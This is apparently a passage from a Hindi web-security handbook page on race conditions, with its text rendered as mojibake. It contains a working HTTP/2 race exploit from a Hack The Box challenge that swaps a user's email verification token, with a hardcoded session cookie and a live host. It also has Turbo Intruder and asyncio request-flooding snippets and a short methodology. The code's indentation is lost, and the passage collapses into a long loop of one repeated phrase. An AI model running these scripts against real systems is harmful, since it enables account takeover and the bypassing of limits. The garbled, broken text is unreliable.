* **‡§è‡§ï ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•á ‡§¶‡•Ç‡§∏‡§∞‡•á ‡§§‡§ï ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏‡§ø‡§Ç‡§ó ‡§ï‡•á ‡§¨‡•Ä‡§ö** ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã **‡§µ‡§ø‡§≤‡§Ç‡§¨‡§ø‡§§** ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™ **‡§¶‡•ã‡§®‡•ã‡§Ç ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•á ‡§¨‡•Ä‡§ö ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á** ‡§π‡•à‡§Ç‡•§
* **‡§Æ‡§≤‡•ç‡§ü‡•Ä-‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü** ‡§Ü‡§∞‡§∏‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™ **‡§õ‡§ø‡§™‡•á ‡§π‡•Å‡§è ‡§∏‡•ç‡§•‡§ø‡§§‡§ø** ‡§ï‡•ã ‡§ú‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡•á **‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß** ‡§≠‡•á‡§ú‡§®‡§æ ‡§∂‡•Å‡§∞‡•Ç ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§á‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶ **50 ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß** ‡§≠‡•á‡§ú ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã **‡§õ‡§ø‡§™‡•á ‡§π‡•Å‡§è ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§ï‡§æ ‡§∂‡•ã‡§∑‡§£** ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* **‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§ ‡§™‡§æ‡§Ø‡§•‡§® ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü**: ‡§á‡§∏ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§æ ‡§â‡§¶‡•ç‡§¶‡•á‡§∂‡•ç‡§Ø ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§à‡§Æ‡•á‡§≤ ‡§ï‡•ã ‡§¨‡§¶‡§≤‡§®‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§§‡§ï ‡§®‡§è ‡§à‡§Æ‡•á‡§≤ ‡§ï‡§æ ‡§∏‡§§‡•ç‡§Ø‡§æ‡§™‡§® ‡§ü‡•ã‡§ï‡§® ‡§™‡§ø‡§õ‡§≤‡•á ‡§à‡§Æ‡•á‡§≤ ‡§™‡§∞ ‡§™‡§π‡•Å‡§Ç‡§ö‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à (‡§Ø‡§π ‡§á‡§∏‡§≤‡§ø‡§è ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§ï‡•ã‡§° ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§Ü‡§∞‡§∏‡•Ä ‡§¶‡•á‡§ñ‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ ‡§ú‡§π‡§æ‡§Ç ‡§à‡§Æ‡•á‡§≤ ‡§ï‡•ã ‡§Æ‡•ã‡§°‡§ø‡§´‡§æ‡§à ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§•‡§æ ‡§≤‡•á‡§ï‡§ø‡§® ‡§∏‡§§‡•ç‡§Ø‡§æ‡§™‡§® ‡§™‡•Å‡§∞‡§æ‡§®‡•á ‡§à‡§Æ‡•á‡§≤ ‡§™‡§∞ ‡§≠‡•á‡§ú‡§æ ‡§ó‡§Ø‡§æ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§à‡§Æ‡•á‡§≤ ‡§ï‡•ã ‡§¶‡§∞‡•ç‡§∂‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§µ‡•á‡§∞‡§ø‡§è‡§¨‡§≤ ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§π‡•Ä ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§•‡§æ)‡•§\
‡§ú‡§¨ ‡§π‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§à‡§Æ‡•á‡§≤ ‡§Æ‡•á‡§Ç "‡§â‡§¶‡•ç‡§¶‡•á‡§∂‡•ç‡§Ø" ‡§Æ‡§ø‡§≤‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§π‡§Æ‡•á‡§Ç ‡§™‡§§‡§æ ‡§ö‡§≤‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§π‡§Æ‡§®‡•á ‡§¨‡§¶‡§≤‡•á ‡§ó‡§è ‡§à‡§Æ‡•á‡§≤ ‡§ï‡§æ ‡§∏‡§§‡•ç‡§Ø‡§æ‡§™‡§® ‡§ü‡•ã‡§ï‡§® ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§π‡•à ‡§î‡§∞ ‡§π‡§Æ ‡§π‡§Æ‡§≤‡§æ ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### ‡§ï‡§ö‡•ç‡§ö‡§æ ‡§¨‡•Ä‡§è‡§´

‡§™‡§ø‡§õ‡§≤‡•á ‡§Ö‡§®‡•Å‡§∏‡§Ç‡§ß‡§æ‡§® ‡§∏‡•á ‡§™‡§π‡§≤‡•á ‡§Ø‡•á ‡§ï‡•Å‡§õ payloads ‡§•‡•á ‡§ú‡•ã ‡§ï‡•á‡§µ‡§≤ ‡§è‡§ï RC ‡§ï‡•ã ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•à‡§ï‡•á‡§ü‡•ç‡§∏ ‡§ï‡•ã ‡§ú‡§ø‡§§‡§®‡•Ä ‡§ú‡§≤‡•ç‡§¶‡•Ä ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•ã ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡§§‡•á ‡§•‡•á‡•§

* **Repeater:** ‡§™‡§ø‡§õ‡§≤‡•á ‡§ñ‡§Ç‡§° ‡§∏‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§¶‡•á‡§ñ‡•á‡§Ç‡•§
* **Intruder**: **Intruder** ‡§ï‡•ã **request** ‡§≠‡•á‡§ú‡•á‡§Ç, **Options menu** ‡§Æ‡•á‡§Ç **number of threads** ‡§ï‡•ã **30** ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§ï‡§∞‡•á‡§Ç, **Null payloads** ‡§ï‡•ã payload ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ö‡•Å‡§®‡•á‡§Ç ‡§î‡§∞ **30** ‡§ú‡§®‡§∞‡•á‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### **‡§∏‡•Ä‡§Æ‡§æ-‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ / TOCTOU**

‡§Ø‡§π ‡§∏‡§¨‡§∏‡•á ‡§Æ‡•å‡§≤‡§ø‡§ï ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•Ä ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§® ‡§π‡•à ‡§ú‡§π‡§æ‡§Å **‡§ï‡§Æ ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§Æ‡•á‡§Ç ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§∏‡•Ä‡§Æ‡§æ** ‡§∞‡§ñ‡§®‡•á ‡§µ‡§æ‡§≤‡•Ä **‡§ï‡§Æ‡§ú‡•ã‡§∞‡§ø‡§Ø‡§æ‡§Ç** ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡§Ç‡•§ ‡§ú‡•à‡§∏‡•á ‡§è‡§ï ‡§π‡•Ä ‡§°‡§ø‡§∏‡•ç‡§ï‡§æ‡§â‡§Ç‡§ü ‡§ï‡•ã‡§° ‡§ï‡•ã ‡§µ‡•á‡§¨ ‡§∏‡•ç‡§ü‡•ã‡§∞ ‡§Æ‡•á‡§Ç ‡§ï‡§à ‡§¨‡§æ‡§∞ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ‡•§ ‡§è‡§ï ‡§¨‡§π‡•Å‡§§ ‡§π‡•Ä ‡§∏‡§∞‡§≤ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ [**‡§á‡§∏ ‡§∞‡§ø‡§™‡•ã‡§∞‡•ç‡§ü**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ‡§Ø‡§æ [**‡§á‡§∏ ‡§¨‡§ó**](https://hackerone.com/reports/759247) ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•á ‡§π‡§Æ‡§≤‡•ã‡§Ç ‡§ï‡•á ‡§ï‡§à ‡§∞‡•Ç‡§™ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡•à‡§∏‡•á:

* ‡§è‡§ï ‡§ó‡§ø‡§´‡•ç‡§ü ‡§ï‡§æ‡§∞‡•ç‡§° ‡§ï‡•ã ‡§ï‡§à ‡§¨‡§æ‡§∞ ‡§∞‡§ø‡§°‡•Ä‡§Æ ‡§ï‡§∞‡§®‡§æ
* ‡§â‡§§‡•ç‡§™‡§æ‡§¶ ‡§ï‡•ã ‡§ï‡§à ‡§¨‡§æ‡§∞ ‡§∞‡•á‡§ü ‡§ï‡§∞‡§®‡§æ
* ‡§Ö‡§™‡§®‡•á ‡§ñ‡§æ‡§§‡§æ ‡§∂‡•á‡§∑ ‡§∞‡§æ‡§∂‡§ø ‡§∏‡•á ‡§Ö‡§ß‡§ø‡§ï ‡§®‡§ï‡§¶‡•Ä ‡§®‡§ø‡§ï‡§æ‡§≤‡§®‡§æ ‡§Ø‡§æ ‡§∏‡•ç‡§•‡§æ‡§®‡§æ‡§Ç‡§§‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ
* ‡§è‡§ï ‡§π‡•Ä CAPTCHA ‡§∏‡§Æ‡§æ‡§ß‡§æ‡§® ‡§ï‡§æ ‡§™‡•Å‡§®‡§É ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ
* ‡§è‡§ï ‡§è‡§Ç‡§ü‡•Ä-‡§¨‡•ç‡§∞‡•Ç‡§ü-‡§´‡•ã‡§∞‡•ç‡§∏ ‡§¶‡§∞ ‡§∏‡•Ä‡§Æ‡§æ ‡§ï‡•ã ‡§õ‡§≤‡§ï‡§∞‡§®‡§æ

### **‡§õ‡§ø‡§™‡•Ä ‡§π‡•Å‡§à ‡§â‡§™-‡§∏‡•ç‡§•‡§ø‡§§‡§ø‡§Ø‡§æ‡§Å**

‡§ú‡§ü‡§ø‡§≤ ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§® ‡§ï‡§æ ‡§∂‡•ã‡§∑‡§£ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§Ö‡§ï‡•ç‡§∏‡§∞ ‡§õ‡•ã‡§ü‡•á ‡§Ö‡§µ‡§∏‡§∞‡•ã‡§Ç ‡§ï‡§æ ‡§≤‡§æ‡§≠ ‡§â‡§†‡§æ‡§®‡§æ ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§õ‡§ø‡§™‡•Ä ‡§Ø‡§æ **‡§Ö‡§®‡§ú‡§æ‡§® ‡§Æ‡§∂‡•Ä‡§® ‡§â‡§™-‡§∏‡•ç‡§•‡§ø‡§§‡§ø‡§Ø‡•ã‡§Ç** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§æ‡§§‡§ö‡•Ä‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ø‡§π‡§æ‡§Å ‡§á‡§∏‡§ï‡§æ ‡§§‡§∞‡•Ä‡§ï‡§æ ‡§π‡•à:

1. **‡§õ‡§ø‡§™‡•Ä ‡§â‡§™-‡§∏‡•ç‡§•‡§ø‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•Ä ‡§™‡§π‡§ö‡§æ‡§® ‡§ï‡§∞‡•á‡§Ç**
* ‡§∏‡§∞‡•ç‡§µ‡§æ‡§ß‡§ø‡§ï ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§°‡•á‡§ü‡§æ, ‡§ú‡•à‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§™‡•ç‡§∞‡•ã‡§´‡§æ‡§á‡§≤ ‡§Ø‡§æ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§∞‡•Ä‡§∏‡•á‡§ü ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§Ø‡§æ ‡§¨‡§æ‡§§‡§ö‡•Ä‡§§ ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ 